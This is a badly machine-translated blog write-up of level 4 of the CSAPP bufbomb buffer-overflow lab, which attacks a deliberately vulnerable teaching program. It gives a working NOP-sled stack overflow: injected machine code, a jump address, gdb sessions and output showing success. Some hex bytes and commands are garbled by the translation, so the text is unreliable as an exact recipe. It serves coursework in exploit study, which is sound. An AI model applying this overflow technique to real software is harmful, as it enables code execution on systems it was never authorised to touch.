@@ -1,0 +1,51 @@
+http://blog.chinaunix.net/uid-20551070-id-2826821.html
+
+Providing a bufbomb procedural and sendstring of program in the course homepage on CSAPP 03 years, and asked to enter a string causes an overflow occurs, to perform a specific command, here is the test description . The original words were: The next level is for those who want to push themselves beyond our baseline expectations for the course, and who want to face a challenge in designing buffer overflow attacks that arises in real life. asked, in a total of five difficulty of step-by-step. Exercise 3.38 on the 4th Q and books, 5 asked bufbomb with the-n parameter Nitroglycerin-'the nitroglycerine mode' operation, run by the same input require getbufn function 5 times, and every time the same overflow: upcoming getbufn return value from the default 1 to a cookie (a given 32-digit).
+
+
+
+
+
+the int getbufn ( ) 
+{ 
+    char buf [ 512 ] ; 
+    Gets ( buf ) ; 
+    return 1 ; 
+}
+
+Called the "Nitroglycerin (nitroglycerin), and running getbufn each run stack frame addresses are different, that is the% ebp each time are different, like nitroglycerin as unstable. 4 Q (4 Q called nitroglycerin) getbuf function after special treatment, each run is loaded into a stack frame address, like Nobel invented nitroglycerin (it is estimated that this is only in CMU fish machine, running on my Linux the, getbuf each stack frame address are different) .
+
+Although getbufn each ebp different, but follow the instructions to speak, getbufn runtime alloca library function call system, 0-127 bytes allocated in the stack, so every time getbufn% ebp difference of + -127 bytes. Buf array of 512 bytes, so long as the value ( we take ebp-0x100 ), regardless of% ebp always jump to 512 bytes of buf. Put as long as the range of + -127 bytes jump the nop instruction regardless jump where will continue to run until it encounters a "real overflow instruction. Only in the "real" overflow instruction what to do. the ebp each type, but the input is the same every time, that each covering (% ebp) at the same value. Real overflow instruction "to do one thing is only based on the% esp to restore the original (% ebp) : first casually create an empty file nitro.raw run gdb, set a breakpoint in getbufn executed off point of view% ebp (% ebp) (gdb) b getbufn Breakpoint 1 at 0x8048a69 (gdb) r-t-n <nitro.raw Starting program: / home/ren/labs/L3/bufbomb-t 1-n <nitro.raw Team: 1 cookie: 0x1c2a3245     / / cookie when the argument is-t 1 Breakpoint 1, 0x08048a69 in getbufn () (gdb) x $ ebp 0xbfaf3d38: 0xbfaf3d58 (gdb) p $ ebp $ 32 = (void * ) 0xbfaf3d38 see one frame to% ebp and the Rieng (getbufn Rieng)% ebp difference between the 32, so getbufn execution
+
+
+
+
+mov % ebp , % esp pop % ebp ret
+
+
+
+After esp and one frame to ebp difference between 32-8 = 24. After is executed spill code To return to the original address, a look at the disassembled code
+
+
+
+8048a91 :     e8 ca ff ff ff      call 8048a60 < getbufn > of
+8048a96 :     89 c2              mov % eax , % edx
+
+Return address is 0x8048a96 and know the cookie value equal to 0x1c2a3245 , so the "real overflow instruction" to do is
+
+
+
+68 96 8a 04 08      push $ 0x8048a96 
+8d 6c 24 1c        lea 0x1c ( % esp ) , % ebp  / / above push $ 0x8048a96,% Esp and the original% ebp poor 24 +4 = 0x1C
+b8 45 32 to the 2a 1c      MOV $ 0x1c2a3245 , % eax
+c3                 ret 
+
+Last Jump to where is the getbufn overflow, said above, we take the% ebp-0x100 (% ebp +4) written at the jump address: 0xbfaf3d38-0x100 = 0xbfaf3c38-. (% Ebp) at the writing does not matter what, so I wrote the original value. So last overflow string nitro.txt of is
+
+
+
+9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9,090,909,090,909,090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 68 96 8a 04 08 8d 6c 24 1c b8 45 32 2a 1c c3 58 3d af bf 38 3c af bf
+
+Then the sendstring program to generate the input sequence: 
+the 
+cat nitro.txt | the / SendString-n 5> nitro.raw, has been nitro.raw continue to run it: (gdb) c continuing Type string: KABOOM!: getbufn returned 0x1c2a3245 Keep going Breakpoint 1, 0x08048a69 in getbufn () (gdb) c continuing. Type string: KABOOM!: getbufn returned 0x1c2a3245 Keep going Breakpoint 1 the 0x08048a69 in. getbufn () (gdb) c continuing. Type string: Kaboom!: getbufn returned 0x1c2a3245 Keep going Breakpoint 1, 0x08048a69 in getbufn () (gdb) c continuing. Type string: Kaboom!: getbufn returned 0x1c2a3245, keep going Breakpoint 1, 0x08048a69 in getbufn () (gdb) c Continuing Type string: KABOOM!: getbufn returned 0x1c2a3245 sh: / usr / sbin / sendmail: not found Error: Unable to send validation information to the grading server Program exited normally. ........................... ................................... tired, the beginning of the fifth
